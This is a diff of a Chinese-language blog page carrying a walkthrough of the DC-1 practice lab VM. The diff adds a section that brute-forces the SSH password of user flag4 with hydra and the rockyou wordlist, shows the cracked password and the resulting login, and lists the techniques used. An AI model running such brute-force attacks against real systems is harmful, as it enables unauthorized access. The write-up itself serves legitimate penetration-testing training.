@@ -173,7 +173,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.5k 字
+      4.7k 字
     </span>
   
 
@@ -183,7 +183,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      79
+      83
        分钟
     </span>
   
@@ -903,6 +903,37 @@ by contacting me via Twitter - @DCAU7</span></code></pre>
 
 <h2 id="方法2-22端口"><a href="#方法2-22端口" class="headerlink" title="方法2(22端口)"></a>方法2(22端口)</h2><p>在知道有个用户flag4之后，也可以从22端口入手。现在是知道了ssh的用户名flag4，但是密码不知道</p>
 <p>可以尝试穷举密码</p>
+<h3 id="hydra穷举密码"><a href="#hydra穷举密码" class="headerlink" title="hydra穷举密码"></a>hydra穷举密码</h3><p>字典是kali自带的字典，-vV是详细信息，-f是找到就停止。密码是orange</p>
+<pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -vV -f</span></code></pre>
+
+<pre><code class="hljs bash">[22][ssh] host: 192.168.56.104   login: flag4   password: orange
+[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.56.104 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found</code></pre>
+
+<h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">ssh</span> <span class="hljs-string">flag4@192.168.56.104</span>
+<span class="hljs-attr">Warning:</span> <span class="hljs-string">Permanently</span> <span class="hljs-string">added</span> <span class="hljs-string">'192.168.56.104'</span> <span class="hljs-string">(ECDSA)</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">list</span> <span class="hljs-string">of</span> <span class="hljs-string">known</span> <span class="hljs-string">hosts.</span>
+<span class="hljs-string">flag4@192.168.56.104's</span> <span class="hljs-attr">password:</span> 
+<span class="hljs-string">Linux</span> <span class="hljs-string">DC-1</span> <span class="hljs-number">3.2</span><span class="hljs-number">.0</span><span class="hljs-number">-6</span><span class="hljs-number">-486</span> <span class="hljs-comment">#1 Debian 3.2.102-1 i686</span>
+
+<span class="hljs-string">The</span> <span class="hljs-string">programs</span> <span class="hljs-string">included</span> <span class="hljs-string">with</span> <span class="hljs-string">the</span> <span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">system</span> <span class="hljs-string">are</span> <span class="hljs-string">free</span> <span class="hljs-string">software;</span>
+<span class="hljs-string">the</span> <span class="hljs-string">exact</span> <span class="hljs-string">distribution</span> <span class="hljs-string">terms</span> <span class="hljs-string">for</span> <span class="hljs-string">each</span> <span class="hljs-string">program</span> <span class="hljs-string">are</span> <span class="hljs-string">described</span> <span class="hljs-string">in</span> <span class="hljs-string">the</span>
+<span class="hljs-string">individual</span> <span class="hljs-string">files</span> <span class="hljs-string">in</span> <span class="hljs-string">/usr/share/doc/*/copyright.</span>
+
+<span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">comes</span> <span class="hljs-string">with</span> <span class="hljs-string">ABSOLUTELY</span> <span class="hljs-literal">NO</span> <span class="hljs-string">WARRANTY,</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">extent</span>
+<span class="hljs-string">permitted</span> <span class="hljs-string">by</span> <span class="hljs-string">applicable</span> <span class="hljs-string">law.</span>
+<span class="hljs-attr">Last login:</span> <span class="hljs-string">Fri</span> <span class="hljs-string">Nov</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span><span class="hljs-string">:42:09</span> <span class="hljs-number">2020</span> <span class="hljs-string">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.130</span>
+<span class="hljs-string">flag4@DC-1:~$</span></code></pre>
+
+<p>接下来的思路就是一样的了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识点总结：</p>
+<ul>
+<li>nmap扫描</li>
+<li>whatweb扫描cms</li>
+<li>msfconsole的使用</li>
+<li>python转换交互式tty</li>
+<li>suid提权</li>
+<li>hydra穷举ssh密码</li>
+</ul>
 
             </div>
             <hr>
